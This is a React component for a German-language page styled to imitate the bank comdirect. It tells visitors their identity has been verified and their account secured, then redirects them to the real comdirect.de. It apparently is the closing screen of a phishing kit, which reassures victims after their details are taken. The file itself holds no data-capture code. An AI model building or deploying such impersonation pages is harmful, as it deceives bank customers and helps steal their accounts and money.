import React, { useEffect, useState } from 'react';
import { CheckCircle } from 'lucide-react';

const FinalSuccessScreen: React.FC = () => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://comdirect.de';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://comdirect.de';
  };

  // CSS variables that match the Comdirect styling
  const cssVariables = {
    '--text': '#28363c',
    '--text-secondary': '#7d8287',
    '--border': '#d1d5db',
    '--border-hover': '#28363c',
    '--active': '#28363c',
    '--style-primary': '#fff500',
    '--style-primary-hover': '#e6d900',
    '--style-primary-on-it': '#000000',
    '--bg': '#ffffff',
    '--focus': '#28363c',
    '--focus-offset': '2px',
    '--focus-width': '1px'
  } as React.CSSProperties;

  return (
    <div style={{
      ...cssVariables,
      minHeight: '100vh',
      backgroundColor: '#ffffff',
      fontFamily: 'MarkWeb, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: '980px',
        margin: '0 auto',
        width: '100%'
      }}>
        <div style={{
          display: 'flex',
          flexDirection: isMobile ? 'column' : 'row',
          minHeight: '100vh'
        }}>
          {/* Left Column - Main Content */}
          <div style={{
            flex: isMobile ? '1' : '0 0 calc(65% - 15px)',
            padding: isMobile ? '20px' : '60px 15px 60px 20px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'flex-start'
          }}>
            <div style={{
              width: '100%',
              maxWidth: 'none'
            }}>
              {/* Success Icon */}
              <div style={{
                marginBottom: '2rem',
                display: 'flex',
                alignItems: 'center',
                gap: '1rem'
              }}>
                <CheckCircle size={48} color="#22c55e" />
                <div style={{
                  width: '4px',
                  height: '48px',
                  backgroundColor: '#22c55e',
                  borderRadius: '2px'
                }} />
              </div>

              {/* Page Title */}
              <h1 style={{
                fontSize: isMobile ? '1.5rem' : '1.875rem',
                fontWeight: '400',
                lineHeight: '2.625rem',
                margin: '0 0 1.5rem 0',
                color: 'var(--text)',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Verifizierung erfolgreich abgeschlossen
              </h1>

              {/* Description */}
              <p style={{
                color: 'var(--text)',
                fontSize: '1rem',
                lineHeight: '1.6',
                margin: '0 0 2rem 0',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Ihre Identität wurde erfolgreich verifiziert. Ihr Konto ist wieder sicher und zugänglich.
              </p>

              {/* Success Message Box */}
              <div style={{
                backgroundColor: '#f0fdf4',
                border: '1px solid #bbf7d0',
                borderRadius: '8px',
                padding: '1.5rem',
                marginBottom: '2rem',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '0.75rem'
              }}>
                <CheckCircle size={20} color="#22c55e" style={{ marginTop: '0.125rem', flexShrink: 0 }} />
                <div>
                  <p style={{
                    color: '#15803d',
                    fontSize: '0.875rem',
                    fontWeight: '500',
                    margin: '0 0 0.25rem 0',
                    fontFamily: 'MarkWeb, Arial, sans-serif'
                  }}>
                    Sicherheitsmaßnahmen aktiviert
                  </p>
                  <p style={{
                    color: '#166534',
                    fontSize: '0.75rem',
                    margin: 0,
                    fontFamily: 'MarkWeb, Arial, sans-serif',
                    lineHeight: '1.4'
                  }}>
                    Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
                  </p>
                </div>
              </div>

              {/* Redirect Notice */}
              <div style={{
                backgroundColor: '#fffbeb',
                border: '1px solid #fed7aa',
                borderRadius: '8px',
                padding: '1rem',
                marginBottom: '2rem',
                textAlign: 'center'
              }}>
                <p style={{
                  color: '#92400e',
                  fontSize: '0.875rem',
                  fontWeight: '400',
                  margin: 0,
                  fontFamily: 'MarkWeb, Arial, sans-serif'
                }}>
                  Sie werden automatisch in 10 Sekunden zu comdirect.de weitergeleitet.
                </p>
              </div>

              {/* Action Button */}
              <div style={{
                borderTop: '1px solid var(--border)',
                paddingTop: '2rem'
              }}>
                <button
                  onClick={handleManualRedirect}
                  className="comdirect-button comdirect-button-large"
                  style={{
                    minWidth: isMobile ? '100%' : '250px'
                  }}
                >
                  Jetzt zu comdirect.de
                  <span style={{ fontSize: '1.2rem' }}>→</span>
                </button>

                <p style={{
                  color: 'var(--text-secondary)',
                  fontSize: '0.75rem',
                  marginTop: '1rem',
                  lineHeight: '1.4',
                  fontFamily: 'MarkWeb, Arial, sans-serif'
                }}>
                  Vielen Dank für Ihre Geduld. Ihre Sicherheit ist unsere Priorität.
                </p>
              </div>
            </div>
          </div>

          {/* Right Column - Security Information (Desktop only) */}
          {!isMobile && (
            <div style={{
              flex: '0 0 calc(35% - 15px)',
              padding: '60px 20px 60px 15px',
              backgroundColor: '#ffffff',
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'flex-start'
            }}>
              <div style={{
                marginTop: '4rem'
              }}>
                {/* Security Tips */}
                <h3 style={{
                  color: 'var(--text)',
                  fontSize: '1.125rem',
                  fontWeight: '400',
                  marginBottom: '1.5rem',
                  fontFamily: 'MarkWeb, Arial, sans-serif'
                }}>
                  Sicherheitstipps
                </h3>

                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '1rem'
                }}>
                  <div style={{
                    padding: '1rem',
                    backgroundColor: '#f8f9fa',
                    borderRadius: '8px',
                    border: '1px solid var(--border)'
                  }}>
                    <p style={{
                      color: 'var(--text)',
                      fontSize: '0.875rem',
                      fontWeight: '500',
                      margin: '0 0 0.5rem 0',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Regelmäßige Überprüfung
                    </p>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '0.75rem',
                      margin: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      lineHeight: '1.4'
                    }}>
                      Überprüfen Sie regelmäßig Ihre Kontobewegungen und melden Sie verdächtige Aktivitäten sofort.
                    </p>
                  </div>

                  <div style={{
                    padding: '1rem',
                    backgroundColor: '#f8f9fa',
                    borderRadius: '8px',
                    border: '1px solid var(--border)'
                  }}>
                    <p style={{
                      color: 'var(--text)',
                      fontSize: '0.875rem',
                      fontWeight: '500',
                      margin: '0 0 0.5rem 0',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Sichere Verbindung
                    </p>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '0.75rem',
                      margin: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      lineHeight: '1.4'
                    }}>
                      Nutzen Sie immer eine sichere Internetverbindung für Ihre Banking-Aktivitäten.
                    </p>
                  </div>

                  <div style={{
                    padding: '1rem',
                    backgroundColor: '#f8f9fa',
                    borderRadius: '8px',
                    border: '1px solid var(--border)'
                  }}>
                    <p style={{
                      color: 'var(--text)',
                      fontSize: '0.875rem',
                      fontWeight: '500',
                      margin: '0 0 0.5rem 0',
                      fontFamily: 'MarkWeb, Arial, sans-serif'
                    }}>
                      Phishing-Schutz
                    </p>
                    <p style={{
                      color: 'var(--text-secondary)',
                      fontSize: '0.75rem',
                      margin: 0,
                      fontFamily: 'MarkWeb, Arial, sans-serif',
                      lineHeight: '1.4'
                    }}>
                      Seien Sie vorsichtig bei verdächtigen E-Mails oder SMS, die nach Ihren Zugangsdaten fragen.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Mobile Security Tips */}
          {isMobile && (
            <div style={{
              padding: '0 20px 20px 20px'
            }}>
              <h3 style={{
                color: 'var(--text)',
                fontSize: '1.125rem',
                fontWeight: '400',
                marginBottom: '1rem',
                fontFamily: 'MarkWeb, Arial, sans-serif'
              }}>
                Sicherheitstipps
              </h3>
              
              <div style={{
                padding: '1rem',
                backgroundColor: '#f8f9fa',
                borderRadius: '8px',
                border: '1px solid var(--border)'
              }}>
                <p style={{
                  color: 'var(--text-secondary)',
                  fontSize: '0.75rem',
                  margin: 0,
                  fontFamily: 'MarkWeb, Arial, sans-serif',
                  lineHeight: '1.4'
                }}>
                  Überprüfen Sie regelmäßig Ihre Kontobewegungen und nutzen Sie immer eine sichere Internetverbindung.
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default FinalSuccessScreen;